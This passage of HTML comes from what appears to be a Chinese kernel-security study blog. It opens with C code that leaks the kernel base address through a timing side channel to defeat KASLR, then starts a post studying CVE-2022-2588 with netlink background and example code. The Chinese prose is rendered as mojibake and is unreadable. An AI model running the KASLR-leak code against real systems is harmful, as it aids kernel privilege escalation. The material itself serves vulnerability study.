  : <span class="string">&quot;rax&quot;</span>, <span class="string">&quot;rbx&quot;</span>, <span class="string">&quot;rcx&quot;</span>, <span class="string">&quot;rdx&quot;</span>)</span></span>;</span><br><span class="line">  a = (b &lt;&lt; <span class="number">32</span>) | a;</span><br><span class="line">  c = (d &lt;&lt; <span class="number">32</span>) | c;</span><br><span class="line">  <span class="keyword">return</span> c - a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STEP 0x100000ull</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SCAN_START KERNEL_LOWER_BOUND + entry_SYSCALL_64_offset</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SCAN_END KERNEL_UPPER_BOUND + entry_SYSCALL_64_offset</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DUMMY_ITERATIONS 5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ITERATIONS 100</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ARR_SIZE (SCAN_END - SCAN_START) / STEP</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">leak_syscall_entry</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> data[ARR_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">uint64_t</span> min = ~<span class="number">0</span>, addr = ~<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ITERATIONS + DUMMY_ITERATIONS; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">uint64_t</span> idx = <span class="number">0</span>; idx &lt; ARR_SIZE; idx++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">uint64_t</span> test = SCAN_START + idx * STEP;</span><br><span class="line">            syscall(<span class="number">104</span>);</span><br><span class="line">            <span class="keyword">uint64_t</span> time = sidechannel(test);</span><br><span class="line">            <span class="keyword">if</span> (i &gt;= DUMMY_ITERATIONS)</span><br><span class="line">                data[idx] += time;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ARR_SIZE; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        data[i] /= ITERATIONS;</span><br><span class="line">        <span class="keyword">if</span> (data[i] &lt; min)</span><br><span class="line">        &#123;</span><br><span class="line">            min = data[i];</span><br><span class="line">            addr = SCAN_START + i * STEP;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%llx %ld\n&quot;</span>, (SCAN_START + i * STEP), data[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] entry_SYSCALL_6_addr:%p\n&quot;</span>,addr);</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span> (<span class="string">&quot;KASLR base %llx\n&quot;</span>, leak_syscall_entry() - entry_SYSCALL_64_offset);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="æ”»å‡»æ•ˆæœ"><a href="#æ”»å‡»æ•ˆæœ" class="headerlink" title="æ”»å‡»æ•ˆæœ"></a>æ”»å‡»æ•ˆæœ</h3><p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20230131163442189.png" alt="image-20230131163442189"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/08/cve-2022-2588/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/08/cve-2022-2588/" class="post-title-link" itemprop="url">cve-2022-2588</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2023-02-08 18:57:09 / ä¿®æ”¹æ—¶é—´ï¼š20:41:25" itemprop="dateCreated datePublished" datetime="2023-02-08T18:57:09+08:00">2023-02-08</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="cve-2022-2588å­¦ä¹ "><a href="#cve-2022-2588å­¦ä¹ " class="headerlink" title="cve-2022-2588å­¦ä¹ "></a>cve-2022-2588å­¦ä¹ </h1><p>æ„Ÿè§‰å¥½ç‰›ï¼Œçœ‹æè¿°æ˜¯ä¸€ä¸ªexpå¯ä»¥å®Œæˆå¤šä¸ªç‰ˆæœ¬çš„é€šæ€ï¼Œå› ä¸ºåœ¨expä¸­å¹¶æ²¡æœ‰ä½¿ç”¨æŸä¸€ä¸ªç‰¹å®šçš„å†…æ ¸åœ°å€ï¼Œæ‰€ä»¥å°±æ˜¯è¯´è¿™ä¸ªexpæ²¡æœ‰åœ°å€ä¾èµ–ï¼Œæ²¡æœ‰åœ°å€ä¾èµ–é‚£å°±æ²¡æœ‰å†…æ ¸ç‰ˆæœ¬é™åˆ¶äº†ã€‚æœ€ä¸»è¦è¿˜æ˜¯æƒ³å­¦ä¹ ä¸€ä¸‹è¿™ä¸ªæ¼æ´åˆ©ç”¨æ‰æƒ³ç€å­¦ä¹ è¿™ä¸ªcveçš„ï¼Œä½†æ˜¯ä¸€çœ‹expäººå‚»äº†ï¼Œä¸ƒå…«ç™¾è¡Œï¼Œå†åŠ ä¸Šç½‘ä¸Šçš„èµ„æ–™å¾ˆå°‘ã€‚ã€‚ã€‚å½³äºã€‚ã€‚ã€‚ä¸€å‘¨åŠèµ·æ­¥äº†ã€‚</p>
<h2 id="å‰ç½®çŸ¥è¯†æµ…å­¦"><a href="#å‰ç½®çŸ¥è¯†æµ…å­¦" class="headerlink" title="å‰ç½®çŸ¥è¯†æµ…å­¦"></a>å‰ç½®çŸ¥è¯†æµ…å­¦</h2><h3 id="å†…æ ¸è·¯ç”±è¡¨"><a href="#å†…æ ¸è·¯ç”±è¡¨" class="headerlink" title="å†…æ ¸è·¯ç”±è¡¨"></a>å†…æ ¸è·¯ç”±è¡¨</h3><p>ä¸åªæ˜¯è·¯ç”±å™¨éœ€è¦è·¯ç”±è¡¨ï¼Œä¸»æœºè‡ªå·±ä¹Ÿå¾—æœ‰è·¯ç”±è¡¨ï¼Œè·¯ç”±è¡¨çš„ä½œç”¨å…¶å®å°±ç±»ä¼¼äºå¯¼èˆªçš„ä½œç”¨ï¼Œå®ƒå‘Šè¯‰ä¸»æœºæ•°æ®åŒ…åº”è¯¥è½¬å‘åˆ°å“ªé‡Œã€‚å¦‚æœä¸»æœºä¸å«è·¯ç”±è¡¨ï¼Œé‚£ä¹ˆå®ƒæ‰€æœ‰çš„æ•°æ®åŒ…éƒ½ä¼ é€ä¸å‡ºå»ã€‚æ‰€ä»¥ä¸å…³äº‹è·¯ç”±å™¨ï¼Œä¸»æœºä¹Ÿä¼šæœ‰è‡ªå·±çš„è·¯ç”±è¡¨ã€‚</p>
<p>å¯ä»¥é€šè¿‡<code>route -n</code>æ¥æŸ¥çœ‹ä¸»æœºçš„è·¯ç”±è¡¨,ä¸‹é¢æ˜¯æˆ‘è™šæ‹Ÿæœºçš„è·¯ç”±è¡¨ã€‚</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">å†…æ ¸ IP è·¯ç”±è¡¨</span><br><span class="line">ç›®æ ‡            ç½‘å…³            å­ç½‘æ©ç         æ ‡å¿—  è·ƒç‚¹   å¼•ç”¨  ä½¿ç”¨ æ¥å£</span><br><span class="line">0.0.0.0         192.168.11.2    0.0.0.0         UG    100    0        0 ens33</span><br><span class="line">169.254.0.0     0.0.0.0         255.255.0.0     U     1000   0        0 ens33</span><br><span class="line">172.17.0.0      0.0.0.0         255.255.0.0     U     0      0        0 docker0</span><br><span class="line">192.168.11.0    0.0.0.0         255.255.255.0   U     100    0        0 ens33</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä¸€æ¡è·¯ç”±ä¿¡æ¯ä¸»è¦åŒ…æ‹¬ä»¥ä¸‹å‡ ç‚¹ã€‚</p>
<ul>
<li>ç›®çš„åœ°å€</li>
<li>ä¸‹ä¸€è·³åœ°å€</li>
<li>å­ç½‘æ©ç </li>
<li>ç½‘å¡æ¥å£</li>
</ul>
<h3 id="å†…æ ¸å­ç³»ç»Ÿ"><a href="#å†…æ ¸å­ç³»ç»Ÿ" class="headerlink" title="å†…æ ¸å­ç³»ç»Ÿ"></a>å†…æ ¸å­ç³»ç»Ÿ</h3><p>linuxå†…æ ¸ä¸»è¦ç”±ä»¥ä¸‹ä¸ƒä¸ªå­ç³»ç»Ÿç»„æˆï¼Œå…¶ä¸­æœ€ä¸»è¦çš„å››ä¸ªå­ç³»ç»Ÿæ˜¯å†…å­˜ç®¡ç†å­ç³»ç»Ÿã€è¿›ç¨‹ç®¡ç†å­ç³»ç»Ÿã€ç½‘ç»œå­ç³»ç»Ÿã€è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿã€‚</p>
<p><img src="https://sslstatic.ktanx.com/images/release/201507/vCXhMhdY8blZcpZS.png" alt="img"></p>
<p>å„ä¸ªæ¨¡å—çš„å¤§æ¦‚ä¾èµ–å¦‚ä¸‹</p>
<p><img src="https://gss0.baidu.com/9vo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/b219ebc4b74543a9432ff93319178a82b901141c.jpg" alt="image"></p>
<p>ç¨å¾®å¯¹ç½‘ç»œå­ç³»ç»Ÿå’Œè™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿåšä¸ªäº†è§£</p>
<p><strong>ç½‘ç»œå­ç³»ç»Ÿ</strong></p>
<p>Linuxç½‘ç»œå­ç³»ç»Ÿæä¾›äº†å¯¹å„ç§ç½‘ç»œæ ‡å‡†çš„å­˜å–å’Œå„ç§ç¡¬ä»¶çš„æ”¯æŒã€‚ä¸‹å›¾æ˜¯å…¶æ•´ä½“ç»“æ„ã€‚å…¶å¯ä»¥åˆ†ä¸ºåè®®å±‚å’Œç½‘ç»œé©±åŠ¨ç¨‹åºï¼Œå…¶ä¸­ç½‘ç»œåè®®ä¸»è¦è´Ÿè´£å®ç°æ¯ä¸€ç§å¯èƒ½çš„ç½‘ç»œä¼ è¾“åè®®ï¼Œè€Œç½‘ç»œé©±åŠ¨ç¨‹åºè´Ÿè´£ä¸ç¡¬ä»¶é€šä¿¡ã€‚</p>
<p><img src="https://sslstatic.ktanx.com/images/release/201507/k5OzlWd2Xaj4tCLd.png" alt="img"></p>
<p><strong>è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿ</strong></p>
<p>Linuxè™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼ˆVFSï¼‰éšè—äº†å„ç§ç¡¬ä»¶çš„å…·ä½“ç»†èŠ‚ï¼Œä¸ºæ‰€æœ‰çš„è®¾å¤‡æä¾›äº†ç»Ÿä¸€çš„æ¥å£ï¼Œå®ƒæ˜¯å¯¹å„ç§æ–‡ä»¶ç³»ç»Ÿçš„ä¸€ä¸ªæŠ½è±¡ï¼Œå…¶å®ä½¿ç”¨è¶…çº§å—super blockå­˜æ”¾æ–‡ä»¶ç³»ç»Ÿç›¸å…³ä¿¡æ¯ï¼Œä½¿ç”¨ç´¢å¼•èŠ‚ç‚¹inodeå­˜æ”¾æ–‡ä»¶çš„ç‰©ç†ä¿¡æ¯ï¼Œä½¿ç”¨ç›®å½•é¡¹dentryå­˜æ”¾æ–‡ä»¶çš„é€»è¾‘ä¿¡æ¯ï¼Œå…¶æ•´ä½“æ¶æ„å¦‚ä¸‹ã€‚</p>
<p><img src="https://sslstatic.ktanx.com/images/release/201507/X0r753n1J4IOqyUk.png" alt="img"></p>
<p><strong>å­ç³»ç»Ÿä¹‹é—´é€šä¿¡</strong></p>
<p>å†…æ ¸çš„å­ç³»ç»Ÿä¹‹é—´æ˜¯äº’ç›¸ä¾èµ–çš„ï¼Œå½“æŸä¸ªå­ç³»ç»ŸçŠ¶æ€å‘ç”Ÿæ”¹å˜çš„æ—¶å€™ï¼Œå°±å¿…é¡»ä½¿ç”¨ä¸€å®šçš„æœºåˆ¶å‘ŠçŸ¥ä½¿ç”¨å…¶æœåŠ¡çš„å…¶ä»–å­ç³»ç»Ÿï¼Œä»¥ä¾¿å…¶ä»–å­ç³»ç»Ÿé‡‡å–ç›¸åº”çš„æªæ–½ï¼Œä½†åˆ°åº•å¦‚ä½•åˆ©ç”¨netlinkè¿›è¡Œå­ç³»ç»Ÿä¹‹é—´çš„é€šä¿¡è¿˜æ˜¯æ²¡æœ‰æŸ¥åˆ°ï¼ŒåªçŸ¥é“å„ä¸ªå­ç³»ç»Ÿä¼šå¯¹ä¸åŒçš„æ¶ˆæ¯ä¼šæœ‰ä¸åŒçš„å¤„ç†æªæ–½ã€‚</p>
<h3 id="netlink"><a href="#netlink" class="headerlink" title="netlink"></a>netlink</h3><p>å†…æ ¸å’Œç”¨æˆ·æ€è¿›ç¨‹è¿›è¡ŒåŒå‘é€šä¿¡çš„ä¸€ç§æœºåˆ¶ï¼Œéå¸¸å¼ºå¤§ï¼Œä¸ä»…å¯ä»¥æ”¯æŒå†…æ ¸å­ç³»ç»Ÿå’Œç”¨æˆ·æ€è¿›ç¨‹çš„é€šä¿¡ï¼Œè¿˜å¯ä»¥è¿›è¡Œå†…æ ¸ä¸­ä¸åŒå­ç³»ç»Ÿä¹‹é—´çš„é€šä¿¡ï¼Œä½†æ˜¯æˆ‘åœ¨è°·æ­Œæˆ–è€…ç™¾åº¦ä¸­å¹¶æ²¡æœ‰æ‰¾åˆ°ç›¸å…³æœºåˆ¶è¯´æ˜å’Œä»£ç æ¼”ç¤ºï¼Œåªæœ‰å†…æ ¸å’Œç”¨æˆ·æ€è¿›ç¨‹ä¹‹é—´é€šä¿¡çš„ä»£ç å®è·µã€‚</p>
<p>åˆ›å»ºsocketå¥—æ¥å­—çš„æ—¶å€™çš„ç»“æ„ä½“ï¼Œå’Œç”¨æˆ·æ€socketçš„<code>sockaddr_in</code>ç»“æ„ä½“åŠŸèƒ½ç±»ä¼¼ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">sa_family_t</span>    nl_family;    <span class="comment">/*è¯¥å­—æ®µæ€»æ˜¯ä¸ºAF_NETLINK    */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span>    nl_pad;        <span class="comment">/* ç›®å‰æœªç”¨åˆ°ï¼Œå¡«å……ä¸º0*/</span></span><br><span class="line">    __u32        nl_pid;        <span class="comment">/* process pid    */</span></span><br><span class="line">    __u32        nl_groups;    <span class="comment">/* multicast groups mask */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­<code>nl_pid</code>å­—æ®µæ¯”è¾ƒé‡è¦ï¼Œå½“æœ‰å¤šä¸ªç”¨æˆ·æ€è¿›ç¨‹è¿æ¥å†…æ ¸æ—¶ï¼Œå†…æ ¸é€šè¿‡è¿™ä¸ªå­—æ®µåŒºåˆ†ä¸åŒè¿›ç¨‹ï¼Œä¸€èˆ¬ä½¿ç”¨<code>getpid()</code>èµ‹å€¼ã€‚</p>
<p>netlinkæ¶ˆæ¯ä½“å¦‚ä¸‹</p>
<p><img src="https://e-mailky.github.io/images/kernel/23069658_1352297109ObJt.jpg" alt="T3"></p>
<p>æ¶ˆæ¯å¤´ç»“æ„ä½“å¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    __u32        nlmsg_len;    <span class="comment">/* Length of message including header */</span></span><br><span class="line">    __u16        nlmsg_type;    <span class="comment">/* Message content */</span></span><br><span class="line">    __u16        nlmsg_flags;    <span class="comment">/* Additional flags */</span></span><br><span class="line">    __u32        nlmsg_seq;    <span class="comment">/* Sequence number */</span></span><br><span class="line">    __u32        nlmsg_pid;    <span class="comment">/* Sending process PID */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="ç”¨æˆ·æ€å’Œå†…æ ¸æ€åŒå‘é€šä¿¡ä»£ç ç¤ºä¾‹"><a href="#ç”¨æˆ·æ€å’Œå†…æ ¸æ€åŒå‘é€šä¿¡ä»£ç ç¤ºä¾‹" class="headerlink" title="ç”¨æˆ·æ€å’Œå†…æ ¸æ€åŒå‘é€šä¿¡ä»£ç ç¤ºä¾‹"></a>ç”¨æˆ·æ€å’Œå†…æ ¸æ€åŒå‘é€šä¿¡ä»£ç ç¤ºä¾‹</h4><p>è¿™ä»½ä»£ç æ˜¯åŸºäºå†…æ ¸2.xçš„ï¼Œä¸çŸ¥é“å¦‚ä»Šå†…æ ¸ç‰ˆæœ¬æ˜¯å¦èƒ½ç”¨ï¼Œå¹¶æœªåšè¿‡å®éªŒï¼Œä»…åšè®°å½•å­¦ä¹ ä½¿ç”¨ã€‚</p>
<p>ç”¨æˆ·æ€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_PAYLOAD 1024 <span class="comment">/*æ¶ˆæ¯æœ€å¤§è´Ÿè½½ä¸º1024å­—èŠ‚*/</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> <span class="title">dest_addr</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">nlh</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span>;</span></span><br><span class="line">    <span class="keyword">int</span> sock_fd=<span class="number">-1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msg</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="number">-1</span> == (sock_fd=socket(PF_NETLINK, SOCK_RAW,NETLINK_TEST)))&#123;</span><br><span class="line">          perror(<span class="string">&quot;can&#x27;t create netlink socket!&quot;</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;dest_addr, <span class="number">0</span>, <span class="keyword">sizeof</span>(dest_addr));</span><br><span class="line">    dest_addr.nl_family = AF_NETLINK;</span><br><span class="line">    dest_addr.nl_pid = <span class="number">0</span>; <span class="comment">/*æˆ‘ä»¬çš„æ¶ˆæ¯æ˜¯å‘ç»™å†…æ ¸çš„*/</span></span><br><span class="line">    dest_addr.nl_groups = <span class="number">0</span>; <span class="comment">/*åœ¨æœ¬ç¤ºä¾‹ä¸­ä¸å­˜åœ¨ä½¿ç”¨è¯¥å€¼çš„æƒ…å†µ*/</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="number">-1</span> == bind(sock_fd, (struct sockaddr*)&amp;dest_addr, <span class="keyword">sizeof</span>(dest_addr)))&#123;</span><br><span class="line">          perror(<span class="string">&quot;can&#x27;t bind sockfd with sockaddr_nl!&quot;</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="literal">NULL</span> == (nlh=(struct nlmsghdr *)<span class="built_in">malloc</span>(NLMSG_SPACE(MAX_PAYLOAD))))&#123;</span><br><span class="line">          perror(<span class="string">&quot;alloc mem failed!&quot;</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(nlh,<span class="number">0</span>,MAX_PAYLOAD);</span><br><span class="line">    <span class="comment">/* å¡«å……Netlinkæ¶ˆæ¯å¤´éƒ¨ */</span></span><br><span class="line">    nlh-&gt;nlmsg_len = NLMSG_SPACE(MAX_PAYLOAD);</span><br><span class="line">    `nlh-&gt;nlmsg_pid = getpid();<span class="comment">//æˆ‘ä»¬å¸Œæœ›å¾—åˆ°å†…æ ¸å›åº”ï¼Œæ‰€ä»¥å¾—å‘Šè¯‰å†…æ ¸æˆ‘ä»¬IDå·`</span></span><br><span class="line">    nlh-&gt;nlmsg_type = NLMSG_NOOP; <span class="comment">//æŒ‡æ˜æˆ‘ä»¬çš„Netlinkæ˜¯æ¶ˆæ¯è´Ÿè½½æ˜¯ä¸€æ¡ç©ºæ¶ˆæ¯</span></span><br><span class="line">    nlh-&gt;nlmsg_flags = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*è®¾ç½®Netlinkçš„æ¶ˆæ¯å†…å®¹ï¼Œæ¥è‡ªæˆ‘ä»¬å‘½ä»¤è¡Œè¾“å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°*/</span></span><br><span class="line">    <span class="built_in">strcpy</span>(NLMSG_DATA(nlh), argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*è¿™ä¸ªæ˜¯æ¨¡æ¿ï¼Œæš‚æ—¶ä¸ç”¨çº ç»“ä¸ºä»€ä¹ˆè¦è¿™æ ·ç”¨ã€‚*/</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;iov, <span class="number">0</span>, <span class="keyword">sizeof</span>(iov));</span><br><span class="line">    iov.iov_base = (<span class="keyword">void</span> *)nlh;</span><br><span class="line">    iov.iov_len = nlh-&gt;nlmsg_len;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    msg.msg_iov = &amp;iov;</span><br><span class="line">    msg.msg_iovlen = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    sendmsg(sock_fd, &amp;msg, <span class="number">0</span>); <span class="comment">//é€šè¿‡Netlink socketå‘å†…æ ¸å‘é€æ¶ˆæ¯</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//æ¥æ”¶å†…æ ¸æ¶ˆæ¯çš„æ¶ˆæ¯</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;waiting message from kernel!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>((<span class="keyword">char</span>*)NLMSG_DATA(nlh),<span class="number">0</span>,<span class="number">1024</span>);</span><br><span class="line">    recvmsg(sock_fd,&amp;msg,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Got response: %s\n&quot;</span>,NLMSG_DATA(nlh));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* å…³é—­netlinkå¥—æ¥å­— */</span></span><br><span class="line">    close(sock_fd);</span><br><span class="line">    <span class="built_in">free</span>(nlh);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å†…æ ¸æ€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span 